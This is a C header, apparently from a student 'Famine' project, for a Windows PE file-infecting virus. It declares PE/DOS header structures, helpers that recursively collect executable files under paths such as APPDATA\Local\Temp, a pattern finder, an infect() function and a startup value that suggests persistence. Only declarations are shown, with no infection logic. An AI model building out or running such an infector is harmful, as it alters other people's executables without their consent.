#ifndef INFECTION_H
# define INFECTION_H

# include <stdio.h>
# include <locale.h>
# include <windows.h>
# include <dirent.h>
# include <sys/types.h>
# include <sys/stat.h>
# include <unistd.h>
# include <fcntl.h>
# include <errno.h>
# include <stdarg.h>
# include <signal.h>
# include <stdio.h>
# include <stdlib.h>
# include <string.h>

# define APP_ENV			"APPDATA"
# define TEMP_PATH			"\\Local\\Temp"
# define BACKSLASH			"\\"
# define DEBUG_MODE			"DEBUG"
# define RECURSIVE_MODE		"RECURSIVE"
# define bool				int
# define boolean			int
# define true				1
# define false				0
# define NO_FLAGS			0
# define EXIT_CODE			-1
# define MAGIC_LENGTH		2
# define DOS_MAGIC			"4D5A" // MZ - constant signature
# define PE_SIGNATURE		"4550" // soit "PE\0\0"

# define IS_UNKNOW_BINARY_TYPE	0
# define IS_PE_BINARY_TYPE		1
# define IS_DOS_BINARY_TYPE		2

# define ARCHITECTURE_64	"20b" // 64b hex
# define SIGNATURE 			"frmarinh-jguyet"
# define STARTUP_VALUE		"Famine startup"
# define ARGS_STARTUP		" %DEBUG"
# define MAX_WINDOWS_PATH	1024
# define MAX_RECURSIVE_PATH	4096

# define PATTERN			0x01, 0x03, 0x03, 0x07, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x55

typedef __int32				int32_t;
typedef unsigned __int32	uint32_t;

#ifndef _WINDEF_
	# define _WINDEF_
	/*
	**	Variable type definition
	*/
	typedef unsigned long       DWORD;
	typedef int                 BOOL;
	typedef unsigned char       BYTE;
	typedef unsigned short      WORD;
	typedef float               FLOAT;
	typedef FLOAT               *PFLOAT;
	typedef BOOL near           *PBOOL;
	typedef BOOL far            *LPBOOL;
	typedef BYTE near           *PBYTE;
	typedef BYTE far            *LPBYTE;
	typedef int near            *PINT;
	typedef int far             *LPINT;
	typedef WORD near           *PWORD;
	typedef WORD far            *LPWORD;
	typedef long far            *LPLONG;
	typedef DWORD near          *PDWORD;
	typedef DWORD far           *LPDWORD;
	typedef void far            *LPVOID;
	typedef CONST void far      *LPCVOID;
	typedef void                *HANDLE;
	typedef int                 INT;
	typedef unsigned int        UINT;
	typedef unsigned int        *PUINT;
	typedef UINT_PTR            WPARAM;
	typedef LONG_PTR            LPARAM;
	typedef LONG_PTR            LRESULT;

	/*
	**	MS-DOS Header
	*/
	typedef struct				_IMAGE_DOS_HEADER
	{
		WORD					e_magic;          // Magic number
	    WORD					e_cblp;           // Bytes on last page of file
	    WORD					e_cp;             // Pages in file
	    WORD					e_crlc;           // Relocations
	    WORD					e_cparhdr;        // Size of header in paragraphs
	    WORD					e_minalloc;       // Minimum extra paragraphs needed
	    WORD					e_maxalloc;       // Maximum extra paragraphs needed
	    WORD					e_ss;             // Initial (relative) SS value
	    WORD					e_sp;             // Initial SP value
	    WORD					e_csum;           // Checksum
	    WORD					e_ip;             // Initial IP value
	    WORD					e_cs;             // Initial (relative) CS value
	    WORD					e_lfarlc;         // File address of relocation table
	    WORD					e_ovno;           // Overlay number
	    WORD					e_res[4];         // Reserved words
	    WORD					e_oemid;          // OEM identifier (for e_oeminfo)
	    WORD					e_oeminfo;        // OEM information; e_oemid specific
	    WORD					e_res2[10];       // Reserved words
	    LONG					e_lfanew;         // File address of new exe header
	}							IMAGE_DOS_HEADER;

	/*
	**	Les répertoires sont des parties du fichier utilisées lors de son chargement.
	**	La position et la taille des données de ces répertoires sont indiquées.
	*/
	typedef struct				_IMAGE_DATA_DIRECTORY
	{
		DWORD					VirtualAddress;
		DWORD					Size;
	}							IMAGE_DATA_DIRECTORY;

	typedef struct				_IMAGE_FILE_HEADER
	{
	  WORD  					Machine;
	  WORD  					NumberOfSections;
	  DWORD 					TimeDateStamp;
	  DWORD 					PointerToSymbolTable;
	  DWORD 					NumberOfSymbols;
	  WORD  					SizeOfOptionalHeader;
	  WORD  					Characteristics;
  	}							IMAGE_FILE_HEADER;

	/*
	**	Optional information about PE
	*/
	typedef struct				_IMAGE_OPTIONAL_HEADER
	{
		WORD					Magic;
		UCHAR					MajorLinkerVersion;
		UCHAR					MinorLinkerVersion;
		ULONG					SizeOfCode;
		ULONG					SizeOfInitializedData;
		ULONG					SizeOfUninitializedData;
		ULONG					AddressOfEntryPoint;
		ULONG					BaseOfCode;
		ULONG					BaseOfData;
		ULONG					ImageBase;
		ULONG					SectionAlignment;
		ULONG					FileAlignment;
		WORD					MajorOperatingSystemVersion;
		WORD					MinorOperatingSystemVersion;
		WORD					MajorImageVersion;
		WORD					MinorImageVersion;
		WORD					MajorSubsystemVersion;
		WORD					MinorSubsystemVersion;
		ULONG					Win32VersionValue;
		ULONG					SizeOfImage;
		ULONG					SizeOfHeaders;
		ULONG					CheckSum;
		WORD					Subsystem;
		WORD					DllCharacteristics;
		ULONG					SizeOfStackReserve;
		ULONG					SizeOfStackCommit;
		ULONG					SizeOfHeapReserve;
		ULONG					SizeOfHeapCommit;
		ULONG					LoaderFlags;
		ULONG					NumberOfRvaAndSizes;
		IMAGE_DATA_DIRECTORY	DataDirectory[16];
	}							IMAGE_OPTIONAL_HEADER;

	/*
	**	La Table des Sections est située juste derrière l'en-tête PE. Il s'agit d'un tableau contenant plusieurs structures IMAGE_SECTION_HEADER.
	**	Ces structures contiennent les informations sur les sections du binaire devant être chargé en mémoire.
	*/
	typedef struct				_IMAGE_SECTION_HEADER
	{
		BYTE					Name[IMAGE_SIZEOF_SHORT_NAME];
		union {
								DWORD PhysicalAddress;
								DWORD VirtualSize;
		} Misc;
		DWORD					VirtualAddress;
		DWORD					SizeOfRawData;
		DWORD					PointerToRawData;
		DWORD					PointerToRelocations;
		DWORD					PointerToLinenumbers;
		WORD					NumberOfRelocations;
		WORD					NumberOfLinenumbers;
		DWORD					Characteristics;
	}							IMAGE_SECTION_HEADER;

	/*
	**	PE Header
	*/
	typedef struct				_IMAGE_NT_HEADER
	{
		DWORD                 	Signature;
		IMAGE_FILE_HEADER     	FileHeader;
		IMAGE_OPTIONAL_HEADER 	OptionalHeader;
	}							IMAGE_NT_HEADERS;
#endif

typedef struct					_IMAGE_DOS
{
	char						*name;
	char						*path;
	int							len;
	char						*buffer;
	char						*new_buffer;
	IMAGE_DOS_HEADER*			dos_header;
	IMAGE_NT_HEADERS*			pe_header;
}								IMAGE_DOS;

/*
** UTILS
*/
char			*ft_strnew(size_t size);
BOOLEAN			file_exists(const char *filename);
BOOLEAN			is_directory(const char *filename);
char			*file_get_contents(const char *filename);
size_t			file_get_contents_size(char **content, const char *filename);
size_t			file_get_contents_len_size(char **content, const char *filename, size_t size);
BOOLEAN			file_put_contents(const char *filename, const char *content);
BOOLEAN			file_put_contents_size(const char *filename, const char *content, size_t size);
size_t			array_length(char **array);
void			free_array(char **array);
char			*file_base_name(const char *file_path);
char			*file_absolute_path(const char *file_path);
char			**ft_split_string(char const *s, char *c);
char			*ft_dstrjoin(char *s1, char *s2, short flag);
char			*ft_strtoupper(char *str);
int				asprintf(char *strp[], const char *fmt, ...);
char			*windows_file_get_contents(char *path);
size_t 			windows_file_get_contents_size(char **content, char *path);
bool			windows_file_put_contents(char *path, char *content);
bool			windows_file_put_contents_size(char *path, char *content, int size);
bool			windows_file_create_contents_size(char *path, char *content, int size);
/*
** WINDOWS BINARY UTILS
*/
int 			get_windows_binary_type(char *header);
bool			is_windows_binary_file(char *file_path);
char			*get_pe_signature(IMAGE_NT_HEADERS *hdr);
bool			is_pe_signature(IMAGE_NT_HEADERS *hdr);
bool			is_pe_x64(IMAGE_NT_HEADERS *pe);

/*
** GETTER
*/
char			**get_files_types(char **files, char *start_path, bool f(char *file_path));

/*
** INFECTION
*/
int				find_pattern(char *file, int len);
void			infect(char *argv);

/*
**	MAIN
*/
void				close_console();
void				start_debug_console();

#endif
